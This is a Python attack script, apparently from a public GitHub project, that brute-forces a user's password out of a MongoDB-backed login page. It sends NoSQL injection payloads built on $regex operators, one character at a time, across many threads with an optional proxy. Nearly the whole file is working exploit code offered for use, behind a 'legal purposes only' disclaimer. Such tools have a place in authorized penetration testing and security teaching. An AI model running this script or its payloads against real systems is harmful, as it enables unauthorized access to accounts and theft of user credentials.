#!/usr/bin/env python3

# MongolDB NoSQL Injection - A Python script build to extract user password
# Copyright (C) 2020 https://github.com/PurnanshDavawala/NoSQLInjection
#
# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool.  The author accepts no liability
# for damage caused by this tool.  If these terms are not acceptable to you, then
# do not use this tool.
#
# In all other respects the GPL version 3 applies:
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2 as
# published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program.
#
# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool.  If these terms are not acceptable to
# you, then do not use this tool.
#
# You are encouraged to send comments, improvements or suggestions to
# me at https://github.com/PurnanshDavawala/NoSQLInjection
#
# Description
# -----------
# This script will perform a NoSQL bruteforce attack against the login page
# and extract possible user password
#
# Limitations
# -----------
# This script only works with NoSQL database and web-server accepting JSON data.
#
# Usage
# -----
# Check the --help for parameter description


import requests
import string
import argparse
from colorama import Fore, Back, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import itertools
import threading
import sys

parser = argparse.ArgumentParser(description='NoSQL Injection')
parser.add_argument('-u', '--URL', type=str, metavar='URL', required=True, help='Target URL (e.g. "http:#www.example.com/login")')
parser.add_argument('-d', '--data', type=str, metavar='Data', required=False, help='Data string to be sent through POST')
parser.add_argument('-w', '--wordlist', type=str, metavar='Wordlist', required=False, help='Path to the wordlist')
parser.add_argument('-U', '--Username', type=str, metavar='Username', required=True, help='Name of the username parameter')
parser.add_argument('-p', '--proxy', type=str, metavar='Proxy', required=False, help='Use a proxy to connect to the target URL (e.g. "127.0.0.1:8080")')
parser.add_argument('-v', '--verbose', required=False, help='verbose mode', action='store_true')
parser.add_argument('-Lo', '--LogoutIdentifier', type=str, metavar='Logout-Identifier', required=True, help='String identifier from logged out page')
parser.add_argument('-t', '--Threads', type=str, metavar='Threads', required=False, help='Number of concurrent thread, Default 50')
args = parser.parse_args()

URL = args.URL
Username = args.Username
LogoutIdentifier = args.LogoutIdentifier
Thread = 0
Thread = int(args.Threads)
Proxy = args.proxy

done = False
headers = {'Content-Type': 'application/json'}
special_char = [ ' ', '!', '#', '$', '%', '&', '-', '<', '=', '>', '@', '[', ']', '_', '{', '}' ]
possible_chars = list(string.ascii_lowercase) + list(string.ascii_uppercase) + list(string.digits) + list(special_char)
password = ""
proxies =   {
            "http" : "%s" % (Proxy),
            "https" : "%s" % (Proxy)
            }

def FindChar():
    global password
    global done

    if not args.verbose:
        def animate():
            global done

            for c in itertools.cycle(['|', '/', '-', '\\']):
                if done:
                    break
                sys.stdout.write('\rExtracting password for ' + Username +'  ' + c)
                sys.stdout.flush()
                time.sleep(0.1)            
        t = threading.Thread(target=animate)
        t.start()

    def get_url(password):
        payload = '{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (Username, password)
        request = requests.post(URL, data=payload, headers = headers, allow_redirects=True)
        result = password + " " + request.text
        if args.verbose:
            print('[*] Trying: {p}'.format(p = payload))
        return result

    def get_url_with_proxy(password):
        payload = '{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (Username, password)
        request = requests.post(URL, data=payload, headers = headers, allow_redirects=True, proxies=proxies, verify=False)
        result = password + " " + request.text
        if args.verbose:
             print('[*] Trying: {p}'.format(p = payload))
        return result

    processes = []
    del processes[:]
    with ThreadPoolExecutor(max_workers=Thread) as executor:
        for c in possible_chars:
            if args.proxy:
                processes.append(executor.submit(get_url_with_proxy, password + c))
            else:
                processes.append(executor.submit(get_url, password + c))

    for task in as_completed(processes):
        CharPass = True
        if LogoutIdentifier in task.result():
            CharPass = False

        if CharPass == True:
            c = task.result().split(maxsplit=1)
            password = c[0]
                            
            if args.verbose:
                print(Fore.GREEN + "\rFound password charecter : %s   Password : %s" % (password[-1], password))
                print(Style.RESET_ALL)
            FindChar()

        if password[-3:] == "$$$":
            password = password[:-3]
            print(Fore.GREEN + "\rFound password " + password + " for username " + Username)
            print(Style.RESET_ALL)
            done = True
            break
FindChar()
